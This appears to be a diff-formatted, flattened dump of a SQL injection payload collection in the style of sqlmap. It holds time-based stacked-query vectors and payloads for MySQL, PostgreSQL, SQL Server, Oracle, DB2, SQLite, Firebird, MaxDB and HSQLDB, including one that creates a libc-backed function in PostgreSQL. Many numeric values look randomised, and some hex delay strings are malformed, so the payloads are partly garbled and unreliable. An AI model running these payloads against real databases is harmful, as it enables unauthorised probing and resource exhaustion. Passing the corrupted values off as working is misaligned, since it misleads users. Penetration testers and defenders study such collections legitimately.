@@ -1,612 +1,99 @@
-root
-test
-title MySQL >= 5.0.12 stacked queries (comment)
-stype 4
-level 2
-risk 1
-clause 1-8
-where 1
-vector 
 SELECT IF((19),SLEEP(3),29)
-request
-payload 
 SELECT SLEEP(37)
-comment #
-response
-time 96
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 stacked queries
-stype 4
-level 3
-risk 1
-clause 1-8
-where 1
-vector 
 SELECT IF((80),SLEEP(24),22)
-request
-payload 
 SELECT SLEEP(49)
-response
-time 12
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 stacked queries (query SLEEP - comment)
-stype 4
-level 3
-risk 1
-clause 1-8
-where 1
-vector 
 (SELECT * FROM (SELECT(SLEEP(51-(IF(96,0,79)))))Nz1d7DBfN)
-request
-payload 
 (SELECT * FROM (SELECT(SLEEP(100)))e5ZQRgmgj)
-comment #
-response
-time 68
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 stacked queries (query SLEEP)
-stype 4
-level 4
-risk 1
-clause 1-8
-where 1
-vector 
 (SELECT * FROM (SELECT(SLEEP(38-(IF(25,0,28)))))ZFpK65WUb)
-request
-payload 
 (SELECT * FROM (SELECT(SLEEP(71)))MathYtqDv)
-response
-time 76
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL < 5.0.12 stacked queries (BENCHMARK - comment)
-stype 4
-level 3
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT IF((90),BENCHMARK(96000000,MD5('KA3veiJgB')),41)
-request
-payload 
 SELECT BENCHMARK(83000000,MD5('Eoyd5zy3D'))
-comment #
-response
-time [DELAYED]
-details
-dbms MySQL
-title MySQL < 5.0.12 stacked queries (BENCHMARK)
-stype 4
-level 5
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT IF((97),BENCHMARK(64000000,MD5('qVXuS4uRF')),3)
-request
-payload 
 SELECT BENCHMARK(84000000,MD5('CoYPhHm3P'))
-response
-time [DELAYED]
-details
-dbms MySQL
-title PostgreSQL > 8.1 stacked queries (comment)
-stype 4
-level 1
-risk 1
-clause 1-8
-where 1
-vector 
 SELECT (CASE WHEN (78) THEN (SELECT 48 FROM PG_SLEEP(33)) ELSE 75 END)
-request
-payload 
 SELECT PG_SLEEP(54)
-comment --
-response
-time 27
-details
-dbms PostgreSQL
-dbms_version > 8.1
-title PostgreSQL > 8.1 stacked queries
-stype 4
-level 4
-risk 1
-clause 1-8
-where 1
-vector 
 SELECT (CASE WHEN (92) THEN (SELECT 81 FROM PG_SLEEP(94)) ELSE 82 END)
-request
-payload 
 SELECT PG_SLEEP(59)
-response
-time 13
-details
-dbms PostgreSQL
-dbms_version > 8.1
-title PostgreSQL stacked queries (heavy query - comment)
-stype 4
-level 2
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT (CASE WHEN (69) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,61000000)) ELSE 87 END)
-request
-payload 
 SELECT COUNT(*) FROM GENERATE_SERIES(1,95000000)
-comment --
-response
-time [DELAYED]
-details
-dbms PostgreSQL
-title PostgreSQL stacked queries (heavy query)
-stype 4
-level 5
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT (CASE WHEN (86) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,87000000)) ELSE 94 END)
-request
-payload 
 SELECT COUNT(*) FROM GENERATE_SERIES(1,70000000)
-response
-time [DELAYED]
-details
-dbms PostgreSQL
-title PostgreSQL < 8.2 stacked queries (Glibc - comment)
-stype 4
-level 3
-risk 1
-clause 1-8
-where 1
-vector 
 SELECT (CASE WHEN (85) THEN (SELECT 26 FROM SLEEP(54)) ELSE 28 END)
-request
-payload 
 CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT
  SELECT sleep(30)
-comment --
-response
-time 9
-details
-dbms PostgreSQL
-dbms_version < 8.2
-os Linux
-title PostgreSQL < 8.2 stacked queries (Glibc)
-stype 4
-level 5
-risk 1
-clause 1-8
-where 1
-vector 
 SELECT (CASE WHEN (73) THEN (SELECT 38 FROM SLEEP(56)) ELSE 18 END)
-request
-payload 
 CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT
  SELECT sleep(83)
-response
-time 93
-details
-dbms PostgreSQL
-dbms_version < 8.2
-os Linux
-title Microsoft SQL Server/Sybase stacked queries (comment)
-stype 4
-level 1
-risk 1
-clause 1-8
-where 1
-vector 
 IF(36) WAITFOR DELAY '0:0:49'
-request
-payload 
 WAITFOR DELAY '0:0:65'
-comment --
-response
-time 55
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)
-stype 4
-level 2
-risk 1
-clause 1-8
-where 1
-vector 
 DECLARE @x CHAR(9)
 SET @x=0x303a303a338
 IF(11) WAITFOR DELAY @x
-request
-payload 
 DECLARE @x CHAR(9)
 SET @x=0x303a303a32
 WAITFOR DELAY @x
-comment --
-response
-time 88
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Microsoft SQL Server/Sybase stacked queries
-stype 4
-level 4
-risk 1
-clause 1-8
-where 1
-vector 
 IF(8) WAITFOR DELAY '0:0:100'
-request
-payload 
 WAITFOR DELAY '0:0:52'
-response
-time 7
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Microsoft SQL Server/Sybase stacked queries (DECLARE)
-stype 4
-level 5
-risk 1
-clause 1-8
-where 1
-vector 
 DECLARE @x CHAR(9)
 SET @x=0x303a303a331
 IF(81) WAITFOR DELAY @x
-request
-payload 
 DECLARE @x CHAR(9)
 SET @x=0x303a303a344
 WAITFOR DELAY @x
-response
-time 5
-details
-dbms
-Microsoft SQL Server
-Sybase
 title Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)
-stype 4
-level 1
-risk 1
-clause 1-8
-where 1
-vector 
 SELECT CASE WHEN (60) THEN DBMS_PIPE.RECEIVE_MESSAGE('kqipw11q2',17) ELSE 6 END FROM DUAL
-request
-payload 
 SELECT DBMS_PIPE.RECEIVE_MESSAGE('joCPTW45D',4) FROM DUAL
-comment --
-response
-time 41
-details
-dbms Oracle
-title Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)
-stype 4
-level 4
-risk 1
-clause 1-8
-where 1
-vector 
 SELECT CASE WHEN (52) THEN DBMS_PIPE.RECEIVE_MESSAGE('RTC6wEv93',30) ELSE 25 END FROM DUAL
-request
-payload 
 SELECT DBMS_PIPE.RECEIVE_MESSAGE('897jIQMtG',53) FROM DUAL
-response
-time 20
-details
-dbms Oracle
-title Oracle stacked queries (heavy query - comment)
-stype 4
-level 2
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT CASE WHEN (87) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 10 END FROM DUAL
-request
-payload 
 SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5
-comment --
-response
-time [DELAYED]
-details
-dbms Oracle
-title Oracle stacked queries (heavy query)
-stype 4
-level 5
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT CASE WHEN (89) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 84 END FROM DUAL
-request
-payload 
 SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5
-response
-time [DELAYED]
-details
-dbms Oracle
-title Oracle stacked queries (DBMS_LOCK.SLEEP - comment)
-stype 4
-level 4
-risk 1
-clause 1-8
-where 1
-vector 
 BEGIN IF (35) THEN DBMS_LOCK.SLEEP(17)
  ELSE DBMS_LOCK.SLEEP(0)
  END IF
  END
-request
-payload 
 BEGIN DBMS_LOCK.SLEEP(93)
  END
-comment --
-response
-time 45
-details
-dbms Oracle
-title Oracle stacked queries (DBMS_LOCK.SLEEP)
-stype 4
-level 5
-risk 1
-clause 1-8
-where 1
-vector 
 BEGIN IF (45) THEN DBMS_LOCK.SLEEP(18)
  ELSE DBMS_LOCK.SLEEP(0)
  END IF
  END
-request
-payload 
 BEGIN DBMS_LOCK.SLEEP(61)
  END
-response
-time 6
-details
-dbms Oracle
-title Oracle stacked queries (USER_LOCK.SLEEP - comment)
-stype 4
-level 5
-risk 1
-clause 1-8
-where 1
-vector 
 BEGIN IF (76) THEN USER_LOCK.SLEEP(99)
  ELSE USER_LOCK.SLEEP(0)
  END IF
  END
-request
-payload 
 BEGIN USER_LOCK.SLEEP(5)
  END
-comment --
-response
-time 99
-details
-dbms Oracle
-title Oracle stacked queries (USER_LOCK.SLEEP)
-stype 4
-level 5
-risk 1
-clause 1-8
-where 1
-vector 
 BEGIN IF (49) THEN USER_LOCK.SLEEP(67)
  ELSE USER_LOCK.SLEEP(0)
  END IF
  END
-request
-payload 
 BEGIN USER_LOCK.SLEEP(43)
  END
-response
-time 74
-details
-dbms Oracle
-title IBM DB2 stacked queries (heavy query - comment)
-stype 4
-level 3
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (41)
-request
-payload 
 SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3
-comment --
-response
-time [DELAYED]
-details
-dbms IBM DB2
-title IBM DB2 stacked queries (heavy query)
-stype 4
-level 5
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (67)
-request
-payload 
 SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3
-response
-time [DELAYED]
-details
-dbms IBM DB2
-title SQLite > 2.0 stacked queries (heavy query - comment)
-stype 4
-level 3
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT (CASE WHEN (22) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3900000000/2))))) ELSE 91 END)
-request
-payload 
 SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
-comment --
-response
-time [DELAYED]
-details
-dbms SQLite
-dbms_version > 2.0
-title SQLite > 2.0 stacked queries (heavy query)
-stype 4
-level 5
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT (CASE WHEN (66) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) ELSE 84 END)
-request
-payload 
 SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(7400000000/2))))
-response
-time [DELAYED]
-details
-dbms SQLite
-dbms_version > 2.0
-title Firebird stacked queries (heavy query - comment)
-stype 4
-level 4
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT IIF((61),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),51) FROM RDB$DATABASE
-request
-payload 
 SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4
-comment --
-response
-time [DELAYED]
-details
-dbms Firebird
-dbms_version >= 2.0
-title Firebird stacked queries (heavy query)
-stype 4
-level 5
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT IIF((30),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),54) FROM RDB$DATABASE
-request
-payload 
 SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4
-response
-time [DELAYED]
-details
-dbms Firebird
-dbms_version >= 2.0
-title SAP MaxDB stacked queries (heavy query - comment)
-stype 4
-level 4
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (6)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (12)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (9)) AS T3
-request
-payload 
 SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3
-comment --
-response
-time [DELAYED]
-details
-dbms SAP MaxDB
-title SAP MaxDB stacked queries (heavy query)
-stype 4
-level 5
-risk 2
-clause 1-8
-where 1
-vector 
 SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (25)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (94)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (94)) AS T3
-request
-payload 
 SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3
-response
-time [DELAYED]
-details
-dbms SAP MaxDB
-title HSQLDB >= 1.7.2 stacked queries (heavy query - comment)
-stype 4
-level 4
-risk 2
-clause 1-8
-where 1
-vector 
 CALL CASE WHEN (46) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),1100000000),NULL) END
-request
-payload 
 CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(75),0),2800000000),NULL)
-comment --
-response
-time 51
-details
-dbms HSQLDB
-dbms_version >= 1.7.2
-title HSQLDB >= 1.7.2 stacked queries (heavy query)
-stype 4
-level 5
-risk 2
-clause 1-8
-where 1
-vector 
 CALL CASE WHEN (40) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(82),0),4300000000),NULL) END
-request
-payload 
 CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(33),0),3000000000),NULL)
-response
-time 88
-details
-dbms HSQLDB
-dbms_version >= 1.7.2
-title HSQLDB >= 2.0 stacked queries (heavy query - comment)
-stype 4
-level 4
-risk 2
-clause 1-8
-where 1
-vector 
 CALL CASE WHEN (73) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),8100000000),NULL) END
-request
-payload 
 CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),6500000000),NULL)
-comment --
-response
-time 82
-details
-dbms HSQLDB
-dbms_version >= 2.0
-title HSQLDB >= 2.0 stacked queries (heavy query)
-stype 4
-level 5
-risk 2
-clause 1-8
-where 1
-vector 
 CALL CASE WHEN (15) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),5800000000),NULL) END
-request
-payload 
 CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),200000000),NULL)
-response
-time 70
-details
-dbms HSQLDB
-dbms_version >= 2.0
